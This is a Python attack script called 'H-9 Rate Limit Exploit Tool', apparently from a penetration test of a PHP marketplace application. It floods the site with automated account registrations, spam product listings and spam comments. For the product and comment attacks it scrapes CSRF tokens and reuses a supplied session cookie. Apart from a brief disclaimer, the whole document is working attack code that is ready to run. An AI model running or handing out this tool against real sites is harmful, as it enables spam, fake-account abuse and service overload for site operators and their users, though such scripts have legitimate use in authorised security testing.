#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
H-9 Rate Limit Exploit Tool (v7 - Final Fix)
This script demonstrates the lack of rate limiting on account creation,
product listing, and commenting functions.

[!] This tool is for educational and demonstration purposes only.
[!] Do not use against systems you do not have explicit permission to test.

Usage:
  python exploit.py <mode> [options]

  If --target is not provided, the script will prompt for it.

Examples:
  # Run in full interactive mode (will ask for URL and Session ID)
  python exploit.py product -n 50

  # Provide target URL via command line (will only ask for Session ID)
  python exploit.py comment -n 200 --id 5 --target http://192.168.178.128
"""

import requests
import argparse
import random
import string
import re
from urllib.parse import urljoin

# --- Configuration ---
REQUEST_TIMEOUT = 3  # seconds

def generate_random_string(length=8):
    """Generate a random alphanumeric string."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def attack_register(base_url, num_requests):
    """
    Sends multiple account registration requests.
    """
    endpoint = "/register.php"
    target_url = urljoin(base_url, endpoint)
    print(f"[*] Starting account registration attack on {target_url}")

    for i in range(1, num_requests + 1):
        username = f"user_{generate_random_string(5)}_{i}"
        password = generate_random_string(10)
        nickname = f"User_{i}"
        
        payload = {
            'loginid': username,
            'password': password,
            'name': nickname
        }
        
        try:
            print(f"[*] Sending request #{i}/{num_requests} | Registering user: {username}")
            response = requests.post(target_url, data=payload, timeout=REQUEST_TIMEOUT)
            print(f"    \_ Status: {response.status_code} | Length: {len(response.text)}")
        except requests.exceptions.Timeout:
            print(f"    [!] Timeout on request #{i}. Server may be overloaded. Skipping.")
            continue
        except requests.exceptions.RequestException as e:
            print(f"[!] Error on request #{i}: {e}")
            break

def attack_product(base_url, num_requests, cookies):
    """
    Sends multiple product listing requests.
    Requires a valid session cookie and fetches CSRF token.
    """
    endpoint = "/product.php?mode=make&id=new"
    target_url = urljoin(base_url, endpoint)
    print(f"[*] Starting product listing attack on {target_url}")

    # --- Auto-fetch CSRF token for product creation ---
    csrf_token = None
    print("[*] Attempting to fetch CSRF token from the product creation page...")
    try:
        get_response = requests.get(target_url, cookies=cookies, timeout=REQUEST_TIMEOUT)
        # Note: The initial form has a typo "csrf_tokon" but the token value is correct.
        match = re.search(r'name="csrf_tokon"\s+value="([a-f0-9]{40})"',
                          get_response.text)
        if match:
            csrf_token = match.group(1)
            print(f"[*] Successfully fetched CSRF token value: {csrf_token}")
        else:
            print("[!] Could not find CSRF token ('csrf_tokon'). The attack will likely fail.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching page to get CSRF token: {e}")
        return

    for i in range(1, num_requests + 1):
        product_name = f"Spam Product {i}"
        description = f"This is an automatically generated product listing ({i})."
        price = random.randint(100, 99999)
        
        # This payload now targets the final 'commit' step directly.
        payload = {
            'title': product_name,
            'text': description,
            'price': price,
            'type': '0',
            'form_state': 'commit' # Target the final registration step
        }
        if csrf_token:
            # The final step expects the field name 'csrf_token' (no typo).
            payload['csrf_token'] = csrf_token
        
        try:
            print(f"[*] Sending request #{i}/{num_requests} | Creating product: {product_name}")
            response = requests.post(target_url, data=payload, cookies=cookies, timeout=REQUEST_TIMEOUT)
            print(f"    \_ Status: {response.status_code} | Length: {len(response.text)}")
        except requests.exceptions.Timeout:
            print(f"    [!] Timeout on request #{i}. Server may be overloaded. Skipping.")
            continue
        except requests.exceptions.RequestException as e:
            print(f"[!] Error on request #{i}: {e}")
            break

def attack_comment(base_url, num_requests, cookies, product_id):
    """
    Sends multiple comment posting requests to a specific product ID.
    Requires a valid session cookie and attempts to fetch the CSRF token.
    """
    endpoint = f"/product.php?mode=show&id={product_id}"
    target_url = urljoin(base_url, endpoint)
    print(f"[*] Starting comment spam attack on Product ID {product_id} at {target_url}")

    # --- Auto-fetch CSRF token --- #
    csrf_token = None
    print("[*] Attempting to fetch CSRF token from the product page...")
    try:
        get_response = requests.get(target_url, cookies=cookies, timeout=REQUEST_TIMEOUT)
        match = re.search(r'name="csrf_token"\s+value="([a-f0-9]{40})"',
                          get_response.text)
        if match:
            csrf_token = match.group(1)
            print(f"[*] Successfully fetched CSRF token: {csrf_token}")
        else:
            print("[!] Could not find CSRF token. The attack will likely fail.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching page to get CSRF token: {e}")
        return

    for i in range(1, num_requests + 1):
        comment_text = f"This is a spam comment number {i}. {generate_random_string(20)}"
        
        payload = {
            'text': comment_text,
            'state': 'comment_commit'
        }
        if csrf_token:
            payload['csrf_token'] = csrf_token
        
        try:
            print(f"[*] Sending request #{i}/{num_requests} | Posting comment...")
            response = requests.post(target_url, data=payload, cookies=cookies, timeout=REQUEST_TIMEOUT)
            print(f"    \_ Status: {response.status_code} | Length: {len(response.text)}")
        except requests.exceptions.Timeout:
            print(f"    [!] Timeout on request #{i}. Server may be overloaded. Skipping.")
            continue
        except requests.exceptions.RequestException as e:
            print(f"[!] Error on request #{i}: {e}")
            break

def main():
    parser = argparse.ArgumentParser(
        description="H-9 Rate Limit Exploit Tool (v7 - Final Fix)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("mode", choices=['register', 'product', 'comment'], help="Attack mode")
    parser.add_argument("-t", "--target", dest="target_url", help="URL of the target application (e.g., http://192.168.178.128)")
    parser.add_argument("-n", "--number", type=int, default=10, help="Number of requests to send")
    parser.add_argument("--id", type=int, default=1, help="Product ID to target for comments. Only used in 'comment' mode.")

    args = parser.parse_args()

    # --- Get Target URL (Interactive) ---
    target_url = args.target_url
    if not target_url:
        target_url = input("[?] Please enter the target URL (e.g., 192.168.178.128): ").strip()
        if not target_url:
            print("[!] Target URL is required. Exiting.")
            return

    # --- Validate and Fix URL Scheme ---
    if not (target_url.startswith('http://') or target_url.startswith('https://')):
        print(f"[!] URL scheme not found. Assuming 'http://'.")
        target_url = 'http://' + target_url

    print("=============================================================")
    print("           Rate Limit Exploit Tool (v7 - Final Fix)          ")
    print("=============================================================")
    print(f"[+] Target: {target_url}")
    print(f"[+] Mode: {args.mode}")
    print(f"[+] Requests: {args.number}")
    if args.mode == 'comment':
        print(f"[+] Target Product ID: {args.id}")
    print("-------------------------------------------------------------")

    # --- Get Session ID (Interactive) ---
    cookies = None
    if args.mode in ['product', 'comment']:
        session_id = input("[?] Please enter your PHPSESSID cookie value: ").strip()
        if not session_id:
            print("[!] Session ID is required for this mode. Exiting.")
            return
        cookies = {'PHPSESSID': session_id}

    if args.mode == 'register':
        attack_register(target_url, args.number)
    elif args.mode == 'product':
        attack_product(target_url, args.number, cookies)
    elif args.mode == 'comment':
        attack_comment(target_url, args.number, cookies, args.id)
    
    print("-------------------------------------------------------------")
    print("[*] Exploit script finished.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user. Exiting.")
